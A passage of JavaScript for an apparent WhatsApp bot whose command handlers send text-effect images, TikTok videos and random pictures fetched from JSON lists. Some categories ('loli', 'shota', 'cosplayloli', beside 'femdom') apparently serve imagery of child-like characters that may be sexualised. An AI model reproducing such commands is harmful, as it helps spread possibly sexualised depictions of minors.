              "https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html";
          if (/smoke/.test(command))
            link =
              "https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html";
          if (/narutobanner/.test(command))
            link =
              "https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html";
          if (/love/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html";
          if (/undergrass/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html";
          if (/doublelove/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/love-text-effect-372.html";
          if (/coffecup/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html";
          if (/underwaterocean/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html";
          if (/smokyneon/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html";
          if (/starstext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html";
          if (/rainboweffect/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html";
          if (/balloontext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html";
          if (/metalliceffect/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html";
          if (/embroiderytext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html";
          if (/flamingtext/.test(command))
            link =
              "https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html";
          let dehe = await photooxy.photoOxy(link, q);
          NhdBotFunc.sendMessage(
            m.chat,
            { image: { url: dehe }, caption: `${mess.success}` },
            { quoted: m }
          );
        }
        break;
      case "tiktokgirl":
        await NhdStickWait();
        var asupan = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokvids/tiktokgirl.json")
        );
        var hasil = pickRandom(asupan);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktokghea":
        await NhdStickWait();
        var gheayubi = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokvids/gheayubi.json")
        );
        var hasil = pickRandom(gheayubi);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktokbocil":
        await NhdStickWait();
        var bocil = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokvids/bocil.json")
        );
        var hasil = pickRandom(bocil);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktoknukhty":
        await NhdStickWait();
        var ukhty = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokvids/ukhty.json")
        );
        var hasil = pickRandom(ukhty);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktoksantuy":
        await NhdStickWait();
        var santuy = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokvids/santuy.json")
        );
        var hasil = pickRandom(santuy);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktokkayes":
        await NhdStickWait();
        var kayes = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokvids/kayes.json")
        );
        var hasil = pickRandom(kayes);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktokpanrika":
        await NhdStickWait();
        var rikagusriani = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokvids/panrika.json")
        );
        var hasil = pickRandom(rikagusriani);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "tiktoknotnot":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokvids/notnot.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, video: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "chinese":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokpics/china.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "hijab":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokpics/hijab.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "indo":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokpics/indonesia.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "japanese":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokpics/japan.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "korean":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokpics/korea.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "malay":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokpics/malaysia.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "randomgirl":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokpics/random.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "randomboy":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokpics/random2.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "thai":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokpics/thailand.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "vietnamese":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/tiktokpics/vietnam.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "aesthetic":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/aesthetic.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "antiwork":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/antiwork.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "blackpink":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/blackpink.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "bike":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/bike.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "boneka":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/boneka.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "cosplay":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/cosplay.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "cat":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/cat.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "doggo":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/doggo.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "justina":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/justina.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "kayes":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/kayes.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "kpop":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/kpop.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "notnot":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/notnot.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "car":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/car.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "couplepp":
      case "ppcouple":
        {
          let anu = require("./HostMedia/randompics/ppcouple.json");
          let random = anu[Math.floor(Math.random() * anu.length)];
          NhdBotFunc.sendMessage(
            from,
            { image: { url: random.male }, caption: `Couple pp for male` },
            { quoted: m }
          );
          NhdBotFunc.sendMessage(
            from,
            { image: { url: random.female }, caption: `Couple pp for female` },
            { quoted: m }
          );
        }
        break;
      case "profilepic":
      case "profilepicture":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/profile.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "pubg":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/pubg.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "rose":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/rose.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "ryujin":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/ryujin.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "ulzzangboy":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/ulzzangboy.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "ulzzanggirl":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/ulzzanggirl.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "wallml":
      case "wallpaperml":
      case "mobilelegend":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/wallml.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "wallpaperphone":
      case "wallphone":
        await NhdStickWait();
        var notnot = JSON.parse(
          fs.readFileSync("./HostMedia/randompics/wallhp.json")
        );
        var hasil = pickRandom(notnot);
        NhdBotFunc.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "animewallpaper2":
      case "animewall2":
        {
          if (!args.join(" "))
            return replygcnhd("What wallpaper are you looking for??");
          let { wallpaper } = require("./lib/scraperW");
          anu = await wallpaper(args);
          result = anu[Math.floor(Math.random() * anu.length)];
          NhdBotFunc.sendMessage(
            m.chat,
            {
              caption: `Title : ${result.title}\nCategory : ${
                result.type
              }\nDetail : ${result.source}\nMedia Url : ${
                result.image[2] || result.image[1] || result.image[0]
              }`,
              image: { url: result.image[0] },
            },
            { quoted: m }
          );
        }
        break;
      case "animewall":
      case "animewallpaper":
        const { AnimeWallpaper } = require("anime-wallpaper");
        if (!q) return replygcnhd("What wallpaper do you want?");
        await NhdStickWait();
        const wall = new AnimeWallpaper();
        const pages = [1, 2, 3, 4];
        const random = pages[Math.floor(Math.random() * pages.length)];
        const wallpaper = await wall
          .getAnimeWall4({ title: q, type: "sfw", page: pages })
          .catch(() => null);
        const i = Math.floor(Math.random() * wallpaper.length);
        await NhdBotFunc.sendMessage(
          m.chat,
          { caption: `*Query :* ${q}`, image: { url: wallpaper[i].image } },
          { quoted: m }
        ).catch((err) => {
          return "Error!";
        });
        //NhdBotFunc.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})
        break;
      case "akira":
      case "akiyama":
      case "ana":
      case "art":
      case "asuna":
      case "ayuzawa":
      case "boruto":
      case "bts":
      case "chiho":
      case "chitoge":
      case "cosplay":
      case "cosplayloli":
      case "cosplaysagiri":
      case "cyber":
      case "deidara":
      case "doraemon":
      case "elaina":
      case "emilia":
      case "erza":
      case "exo":
      case "gamewallpaper":
      case "gremory":
      case "hacker":
      case "hestia":
      case "husbu":
      case "inori":
      case "islamic":
      case "isuzu":
      case "itachi":
      case "itori":
      case "jennie":
      case "jiso":
      case "justina":
      case "kaga":
      case "kagura":
      case "kakasih":
      case "kaori":
      case "cartoon":
      case "shortquote":
      case "keneki":
      case "kotori":
      case "kurumi":
      case "lisa":
      case "loli":
      case "madara":
      case "megumin":
      case "mikasa":
      case "mikey":
      case "miku":
      case "minato":
      case "mountain":
      case "naruto":
      case "neko":
      case "neko2":
      case "nekonime":
      case "nezuko":
      case "onepiece":
      case "pentol":
      case "pokemon":
      case "programming":
      case "randomnime":
      case "randomnime2":
      case "rize":
      case "rose":
      case "sagiri":
      case "sakura":
      case "sasuke":
      case "satanic":
      case "shina":
      case "shinka":
      case "shinomiya":
      case "shizuka":
      case "shota":
      case "space":
      case "technology":
      case "tejina":
      case "toukachan":
      case "tsunade":
      case "waifu":
      case "yotsuba":
      case "yuki":
      case "yulibocil":
      case "yumeko":
        {
          await NhdStickWait();
          let heyy;
          if (/akira/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/akira.json"
            );
          if (/akiyama/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/akiyama.json"
            );
          if (/ana/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/ana.json"
            );
          if (/art/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/art.json"
            );
          if (/asuna/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/asuna.json"
            );
          if (/ayuzawa/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/ayuzawa.json"
            );
          if (/boneka/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/boneka.json"
            );
          if (/boruto/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/boruto.json"
            );
          if (/bts/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/bts.json"
            );
          if (/cecan/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/cecan.json"
            );
          if (/chiho/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/chiho.json"
            );
          if (/chitoge/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/chitoge.json"
            );
          if (/cogan/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/cogan.json"
            );
          if (/cosplay/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/cosplay.json"
            );
          if (/cosplayloli/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/cosplayloli.json"
            );
          if (/cosplaysagiri/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/cosplaysagiri.json"
            );
          if (/cyber/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/cyber.json"
            );
          if (/deidara/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/deidara.json"
            );
          if (/doraemon/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/doraemon.json"
            );
          if (/eba/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/eba.json"
            );
          if (/elaina/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/elaina.json"
            );
          if (/emilia/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/emilia.json"
            );
          if (/erza/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/erza.json"
            );
          if (/exo/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/exo.json"
            );
          if (/femdom/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/femdom.json"
            );
          if (/freefire/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/freefire.json"
            );
          if (/gamewallpaper/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/gamewallpaper.json"
            );
          if (/glasses/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/glasses.json"
            );
          if (/gremory/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/gremory.json"
            );
          if (/hacker/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/hekel.json"
            );
          if (/hestia/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/hestia.json"
            );
          if (/husbu/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/husbu.json"
            );
          if (/inori/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/inori.json"
            );
          if (/islamic/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/islamic.json"
            );
          if (/isuzu/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/isuzu.json"
            );
          if (/itachi/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/itachi.json"
            );
          if (/itori/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/itori.json"
            );
          if (/jennie/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/jeni.json"
            );
          if (/jiso/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/jiso.json"
            );
          if (/justina/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/justina.json"
            );
          if (/kaga/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/kaga.json"
            );
          if (/kagura/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/kagura.json"
            );
          if (/kakasih/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/kakasih.json"
            );
          if (/kaori/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/kaori.json"
            );
          if (/cartoon/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/kartun.json"
            );
          if (/shortquote/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/katakata.json"
            );
          if (/keneki/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/keneki.json"
            );
          if (/kotori/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/kotori.json"
            );
          if (/kpop/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/kpop.json"
            );
          if (/kucing/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/kucing.json"
            );
          if (/kurumi/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/kurumi.json"
            );
          if (/lisa/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/lisa.json"
            );
          if (/loli/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/loli.json"
            );
          if (/madara/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/madara.json"
            );
          if (/megumin/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/megumin.json"
            );
          if (/mikasa/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/mikasa.json"
            );
          if (/mikey/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/mikey.json"
            );
          if (/miku/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/miku.json"
            );
          if (/minato/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/minato.json"
            );
          if (/mobile/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/mobil.json"
            );
          if (/motor/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/motor.json"
            );
          if (/mountain/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/mountain.json"
            );
          if (/naruto/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/naruto.json"
            );
          if (/neko/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/neko.json"
            );
          if (/neko2/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/neko2.json"
            );
          if (/nekonime/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/nekonime.json"
            );
          if (/nezuko/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/nezuko.json"
            );
          if (/onepiece/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/onepiece.json"
            );
          if (/pentol/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/pentol.json"
            );
          if (/pokemon/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/pokemon.json"
            );
          if (/profil/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/profil.json"
            );
          if (/progamming/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/programming.json"
            );
          if (/pubg/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/pubg.json"
            );
          if (/randblackpink/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/randblackpink.json"
            );
          if (/randomnime/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/randomnime.json"
            );
          if (/randomnime2/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/randomnime2.json"
            );
          if (/rize/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/rize.json"
            );
          if (/rose/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/rose.json"
            );
          if (/ryujin/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/ryujin.json"
            );
          if (/sagiri/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/sagiri.json"
            );
          if (/sakura/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/sakura.json"
            );
          if (/sasuke/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/sasuke.json"
            );
          if (/satanic/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/satanic.json"
            );
          if (/shina/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/shina.json"
            );
          if (/shinka/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/shinka.json"
            );
          if (/shinomiya/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/shinomiya.json"
            );
          if (/shizuka/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/shizuka.json"
            );
          if (/shota/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/shota.json"
            );
          if (/space/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/tatasurya.json"
            );
          if (/technology/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/technology.json"
            );
          if (/tejina/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/tejina.json"
            );
          if (/toukachan/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/toukachan.json"
            );
          if (/tsunade/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/tsunade.json"
            );
          if (/waifu/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/waifu.json"
            );
          if (/wallhp/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/wallhp.json"
            );
          if (/wallml/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/wallml.json"
            );
          if (/wallmlnime/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/wallnime.json"
            );
          if (/yotsuba/.test(command))
            heyy = await fetchJson(
              "https://raw.githubusercontent.com/DGNhd/NhdMedia/master/yotsuba.json"
            );
          if (/yuki/.test(command))
